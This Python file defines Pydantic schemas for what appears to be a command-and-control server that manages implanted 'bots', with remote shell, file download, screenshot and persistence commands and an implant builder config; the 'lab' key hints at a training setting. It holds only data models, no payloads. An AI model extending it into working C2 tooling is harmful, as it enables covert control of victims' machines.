"""Pydantic schemas for API request/response models."""

from enum import Enum
from typing import Any

from pydantic import BaseModel, Field


# =============================================================================
# Enums
# =============================================================================


class BotStatus(str, Enum):
    """Bot connection status."""
    ONLINE = "online"      # Connected and heartbeat within 60s
    STALE = "stale"        # Connected but no heartbeat > 60s
    OFFLINE = "offline"    # Not connected


class CommandType(str, Enum):
    """Available command types."""
    SHELL = "shell"
    FILE_LIST = "file_list"
    FILE_DOWNLOAD = "file_download"
    SCREENSHOT = "screenshot"
    PROCESS_LIST = "process_list"
    PERSIST_STATUS = "persist_status"
    PERSIST_REMOVE = "persist_remove"


class CommandStatus(str, Enum):
    """Command lifecycle status."""
    PENDING = "pending"
    DISPATCHED = "dispatched"
    COMPLETED = "completed"
    FAILED = "failed"


# =============================================================================
# Auth Schemas
# =============================================================================


class LoginRequest(BaseModel):
    """Login request body."""
    username: str
    password: str


class LoginResponse(BaseModel):
    """Login response."""
    success: bool
    token: str | None = None
    user: dict | None = None


class UserInfo(BaseModel):
    """Current user info."""
    id: str
    username: str


# =============================================================================
# Bot Schemas
# =============================================================================


class PersistenceMethod(BaseModel):
    """Persistence method status."""
    method: str
    installed: bool


class BotBase(BaseModel):
    """Base bot info."""
    hwid: str
    hostname: str | None = None
    os: str | None = None
    arch: str | None = None
    username: str | None = None
    privileges: str | None = None


class Bot(BotBase):
    """Full bot info including status."""
    av: list[str] = []
    exe_path: str | None = None
    version: str | None = None
    first_seen: int | None = None
    last_seen: int | None = None
    is_connected: bool = False
    last_heartbeat: int | None = None
    client_ip: str | None = None
    persistence: list[PersistenceMethod] = []
    status: BotStatus = BotStatus.OFFLINE


class BotListResponse(BaseModel):
    """List of bots."""
    bots: list[Bot]
    total: int


# =============================================================================
# Command Schemas
# =============================================================================


class ShellArgs(BaseModel):
    """Arguments for shell command."""
    command: str


class FileListArgs(BaseModel):
    """Arguments for file_list command."""
    path: str = "."


class FileDownloadArgs(BaseModel):
    """Arguments for file_download command."""
    path: str


class CommandRequest(BaseModel):
    """Request to send a command."""
    command_type: CommandType
    args: dict = {}


class CommandResponse(BaseModel):
    """Response after sending a command."""
    command_id: str
    status: CommandStatus
    queued: bool = False  # True if bot was offline and command was queued


class Command(BaseModel):
    """Full command info."""
    id: str
    bot_hwid: str
    command_type: str
    args: str | None = None
    status: str
    created_at: int | None = None
    dispatched_at: int | None = None
    completed_at: int | None = None
    operator_id: str | None = None
    response_status: str | None = None
    response_data: str | None = None
    response_received_at: int | None = None


class CommandListResponse(BaseModel):
    """List of commands."""
    commands: list[Command]
    total: int


# =============================================================================
# Download/Screenshot Schemas
# =============================================================================


class Download(BaseModel):
    """Download record."""
    id: str
    bot_hwid: str
    command_id: str | None = None
    remote_path: str | None = None
    local_path: str
    filename: str
    size: int
    sha256: str
    received_at: int


class DownloadListResponse(BaseModel):
    """List of downloads."""
    downloads: list[Download]
    total: int


class Screenshot(BaseModel):
    """Screenshot record."""
    id: str
    bot_hwid: str
    command_id: str | None = None
    local_path: str
    thumbnail_path: str | None = None
    format: str = "png"
    size: int
    width: int | None = None
    height: int | None = None
    received_at: int


class ScreenshotListResponse(BaseModel):
    """List of screenshots."""
    screenshots: list[Screenshot]
    total: int


# =============================================================================
# Builder Schemas
# =============================================================================


class BuilderConfig(BaseModel):
    """Configuration for implant builder."""
    c2_host: str = "127.0.0.1"
    c2_port: int = Field(default=4444, ge=1, le=65535)
    psk: str = "oxide-lab-psk"
    salt_hex: str = ""
    cert_hash_hex: str = ""
    heartbeat_interval: int = Field(default=30, ge=5, le=3600)


class BuilderResponse(BaseModel):
    """Builder response with generated config."""
    config: dict
    filename: str


# =============================================================================
# WebSocket Event Schemas
# =============================================================================


class WSEvent(BaseModel):
    """WebSocket event."""
    type: str
    data: dict
    timestamp: int
